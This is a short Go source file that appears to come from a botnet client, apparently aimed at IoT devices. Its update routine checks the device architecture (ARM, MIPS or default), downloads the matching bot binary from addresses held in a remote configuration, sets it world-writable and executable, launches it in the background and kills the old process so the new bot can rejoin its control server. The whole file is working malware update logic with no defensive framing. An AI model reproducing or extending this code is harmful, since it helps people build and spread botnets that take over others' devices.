package lib

import "time"

func (b *Bot) update() {
	if setCall, setKey := SetupCaller(); setKey {
		defer KILL()
		b.Report("START UPDATING...")
		/*
			Match The bot architecture.
		*/
		switch {
		case Find(execComd("tail", "-1", "/var/tmp/"+fileName(true)), "[arm]"):
			download(fileName(false), setCall.CallBot.ARM_ARCH)
		case Find(execComd("tail", "-1", "/var/tmp/"+fileName(true)), "[mips]"):
			download(fileName(false), setCall.CallBot.MIPS_ARCH)
		default:
			download(fileName(false), setCall.CallBot.DEFAULT_ARCH)
		}
		execComd("chmod", "777", fileName(false))
		go execComd("./"+fileName(false), "&")
		time.Sleep(10 * time.Second) //Wait for the bot to join the server.
	}
}
